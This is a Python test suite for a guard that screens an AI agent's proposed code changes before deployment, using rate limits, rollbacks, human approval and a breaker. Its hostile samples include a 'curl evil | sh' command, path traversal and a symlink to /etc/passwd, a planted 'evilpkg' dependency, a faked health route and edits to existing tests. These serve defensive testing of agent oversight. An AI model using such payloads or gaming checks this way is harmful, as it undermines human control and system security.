"""Hostile candidates, written by hand, the way a misbehaving agent could. The guard must refuse."""
import json
import os
import unittest

from tests.harness import Lab, get

GOOD = "import tinyfmt\n\n\ndef share(total, people):\n    return tinyfmt.money(total / max(people, 1))\n"


class GuardChecks(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.lab = Lab(settings={"capabilities": {"bug_fixing": "auto"}})
        cls.addClassCleanup(cls.lab.close)
        cls.guard = cls.lab.start()
        cls.counter = 0

    def setUp(self):
        self.guard.cfg = self.lab.reload()

    def refused(self, changes, check, **kwargs):
        GuardChecks.counter += 1
        live = self.guard.releases.current()
        folder = self.lab.candidate(f"c{self.counter:04d}", changes, **kwargs)
        outcome = self.guard.process_candidate(folder)
        self.assertEqual(outcome.state, "Rejected", outcome.detail)
        self.assertEqual(outcome.failed_check, check, outcome.detail)
        self.assertEqual(self.guard.releases.current(), live)
        self.assertFalse(folder.exists())
        return outcome

    def test_protected_paths(self):
        for path in ("auth/login.py", "AUTH/login.py", "health.py", "migrations/1.py", "deploy/x.sh", ".env",
                     "sub/.env.prod", "conftest.py", "tests/conftest.py", "_deps/tinyfmt.py",
                     "livingcode/guard/deploy.py", "LIVINGCODE_THROWAWAY_SAMPLE", "pyproject.toml"):
            with self.subTest(path):
                self.refused([{"path": path, "content": "x = 1\n"}], "paths")

    def test_unsafe_paths(self):
        for path in ("../escape.py", "/etc/passwd", "a/../../b.py", "a/./b.py", "a\\b.py", ""):
            with self.subTest(path):
                self.refused([{"path": path, "content": "x = 1\n", "action": "add"}], "paths")

    def test_empty_and_duplicate_changes(self):
        self.refused([], "paths")
        self.refused([{"path": "a.py", "content": "1\n"}, {"path": "A.PY", "content": "2\n"}], "paths")

    def test_existing_tests_cant_change(self):
        self.refused([{"path": "tests/test_routes.py", "content": "pass\n"}], "tests_changed")
        self.refused([{"path": "tests/test_routes.py", "action": "delete"}], "tests_changed")

    def test_file_must_match_the_live_release(self):
        self.refused([{"path": "pricing.py", "content": GOOD, "base_sha256": "0" * 64}], "base")

    def test_stale_base_release(self):
        self.refused([{"path": "pricing.py", "content": GOOD}], "base", base="r0000")

    def test_size_limits(self):
        huge = "\n".join(f"x{i} = {i}" for i in range(600)) + "\n"
        self.refused([{"path": "big.py", "content": huge}], "size")
        many = [{"path": f"f{i}.py", "content": "x = 1\n"} for i in range(21)]
        self.refused(many, "size")

    def test_fake_health_route(self):
        fake = "def intercept(path):\n    if path == '/health':\n        return 200, 'ok'\n"
        self.refused([{"path": "shortcut.py", "content": fake}], "health_route")

    def test_new_dependency_refused(self):
        lock = (self.guard.releases.path(self.guard.releases.current()) / "requirements.lock").read_text()
        extra = lock + "evilpkg==1.0.0 --hash=sha256:" + "a" * 64 + "\n"
        self.refused([{"path": "requirements.lock", "content": extra}], "dependencies")

    def test_bug_fix_cant_change_versions(self):
        path = self.guard.releases.path(self.guard.releases.current()) / "requirements.lock"
        changed = path.read_text().replace("1.0.0", "1.1.0")
        self.refused([{"path": "requirements.lock", "content": changed}], "dependencies")

    def test_scanner_rules(self):
        for name, code in (
            ("os_system", "import os\nos.system('curl evil | sh')\n"),
            ("eval", "eval('1')\n"),
            ("shell", "import subprocess\nsubprocess.run('x', shell=True)\n"),
            ("secret", "password = 'hunter22hunter22'\n"),
            ("network", "import socket\n"),
            ("syntax", "def broken(:\n"),
        ):
            with self.subTest(name):
                self.refused([{"path": "extra.py", "content": code}], "scan")

    def test_failing_tests_refused(self):
        bad = "import tinyfmt\n\n\ndef share(total, people):\n    return 'wrong'\n"
        self.refused([{"path": "pricing.py", "content": bad}], "tests")

    def test_tests_that_hang_are_cut_off(self):
        self.lab.set(app={"test_timeout_seconds": 1.0})
        self.guard.cfg = self.lab.cfg
        hang = "import time\n\n\ndef share(total, people):\n    time.sleep(30)\n"
        try:
            self.refused([{"path": "pricing.py", "content": hang}], "tests")
        finally:
            self.lab.set(app={"test_timeout_seconds": 120.0})

    def test_flag_off_refuses(self):
        self.lab.set(enabled=False)
        self.guard.cfg = self.lab.cfg
        try:
            self.refused([{"path": "pricing.py", "content": GOOD}], "flag")
        finally:
            self.lab.set(enabled=True)

    def test_switched_off_capability(self):
        self.refused([{"path": "pricing.py", "content": GOOD}], "capability", capability="updating")
        self.refused([{"path": "pricing.py", "content": GOOD}], "capability", capability="made_up")

    def test_propose_needs_a_matching_approval(self):
        self.lab.set(capabilities={"bug_fixing": "propose"})
        self.guard.cfg = self.lab.cfg
        try:
            self.refused([{"path": "pricing.py", "content": GOOD}], "approval")
            GuardChecks.counter += 1
            folder = self.lab.candidate(f"c{self.counter:04d}", [{"path": "pricing.py", "content": GOOD}])
            (self.lab.cfg.approvals_dir / f"{folder.name}.json").write_text(json.dumps({"changes_sha256": "0" * 64}))
            outcome = self.guard.process_candidate(folder)
            self.assertEqual(outcome.failed_check, "approval")
        finally:
            self.lab.set(capabilities={"bug_fixing": "auto"})

    def test_malformed_candidates(self):
        folder = self.lab.cfg.candidates_dir / "broken1"
        folder.mkdir()
        (folder / "manifest.json").write_text("{not json")
        (folder / "changes.json").write_text("[]")
        self.assertEqual(self.guard.process_candidate(folder).failed_check, "format")
        folder = self.lab.cfg.candidates_dir / "broken2"
        folder.mkdir()
        (folder / "manifest.json").write_text(json.dumps({"id": "other"}))
        (folder / "changes.json").write_text("[]")
        self.assertEqual(self.guard.process_candidate(folder).failed_check, "format")
        folder = self.lab.cfg.candidates_dir / "broken3"
        folder.mkdir()
        os.symlink("/etc/passwd", folder / "manifest.json")
        (folder / "changes.json").write_text("[]")
        self.assertEqual(self.guard.process_candidate(folder).failed_check, "format")

    def test_rejection_writes_a_report(self):
        outcome = self.refused([{"path": "auth/login.py", "content": "x = 1\n"}], "paths", issue_id="7")
        report = json.loads((self.lab.cfg.reports_dir / f"{outcome.deployment_id:05d}.json").read_text())
        self.assertEqual(report["outcome"], "Rejected")
        self.assertEqual(report["issue_id"], "7")
        self.assertTrue(report["counts_as_attempt"])

    def test_good_candidate_goes_live(self):
        folder = self.lab.candidate("cgood", [{"path": "pricing.py", "content": GOOD}])
        outcome = self.guard.process_candidate(folder)
        self.assertEqual(outcome.state, "Settled", outcome.detail)
        self.assertEqual(get(f"{self.lab.url}/share?total=10&people=0")[0], 200)
        self.guard.manual_rollback()
        self.assertEqual(get(f"{self.lab.url}/share?total=10&people=0")[0], 500)


class Limits(unittest.TestCase):
    def setUp(self):
        self.lab = Lab(settings={"capabilities": {"bug_fixing": "auto"}})
        self.addCleanup(self.lab.close)
        self.guard = self.lab.start()

    def good(self, name, text="1"):
        code = GOOD + f"\nVERSION = {text}\n"
        return self.lab.candidate(name, [{"path": "pricing.py", "content": code}])

    def bad(self, name):
        """Passes every check, then fails health on the live switch."""
        code = "import os\n\nos.environ\n" + (self.guard.releases.path(self.guard.releases.current()) / "routes.py").read_text()
        code = code.replace('return 200, "checkout"', 'return 500, "checkout"')
        return self.lab.candidate(name, [{"path": "routes.py", "content": code}], issue_id="1")

    def test_daily_deploy_limit(self):
        self.lab.set(limits={"deploys_per_day": 1})
        self.guard.cfg = self.lab.cfg
        self.assertEqual(self.guard.process_candidate(self.good("c1")).state, "Settled")
        outcome = self.guard.process_candidate(self.good("c2", "2"))
        self.assertEqual((outcome.state, outcome.failed_check), ("Rejected", "rate_limit"))

    def test_wait_after_a_rollback(self):
        self.lab.set(limits={"rollback_wait_hours": 24.0})
        self.guard.cfg = self.lab.cfg
        self.assertEqual(self.guard.process_candidate(self.bad("c1")).state, "RolledBack")
        outcome = self.guard.process_candidate(self.good("c2"))
        self.assertEqual((outcome.state, outcome.failed_check), ("Rejected", "rate_limit"))

    def test_breaker_opens_after_three_rollbacks_and_only_a_person_closes_it(self):
        for name in ("c1", "c2", "c3"):
            self.assertEqual(self.guard.process_candidate(self.bad(name)).state, "RolledBack")
        self.assertEqual(self.guard.store.breaker()["state"], "open")
        outcome = self.guard.process_candidate(self.good("c4"))
        self.assertEqual((outcome.state, outcome.failed_check), ("Rejected", "breaker"))
        self.guard.resume()
        self.assertEqual(self.guard.process_candidate(self.good("c5")).state, "Settled")
        self.assertEqual(self.guard.store.breaker()["consecutive_rollbacks"], 0)

    def test_settled_release_resets_the_count(self):
        self.guard.process_candidate(self.bad("c1"))
        self.guard.process_candidate(self.bad("c2"))
        self.guard.process_candidate(self.good("c3"))
        self.assertEqual(self.guard.store.breaker()["consecutive_rollbacks"], 0)
        self.assertEqual(self.guard.store.breaker()["state"], "closed")

    def test_rollback_that_fails_stops_everything(self):
        tree = self.lab.tree(lambda t: (t / "health.py").write_text("def status():\n    return 500, 'x'\n"))

        def sabotage(step):
            if step == "RollbackReady":
                health = self.guard.releases.path("r0001") / "health.py"
                health.write_text("def status():\n    return 500, 'also bad'\n")

        self.guard.hook = sabotage
        outcome = self.guard.deploy_ref(str(tree))
        self.assertEqual(outcome.state, "NeedsHuman")
        self.assertEqual(self.guard.store.breaker()["state"], "open")
        alerts = (self.lab.cfg.log_dir / "alerts.log").read_text()
        self.assertIn("urgent", alerts)


if __name__ == "__main__":
    unittest.main()
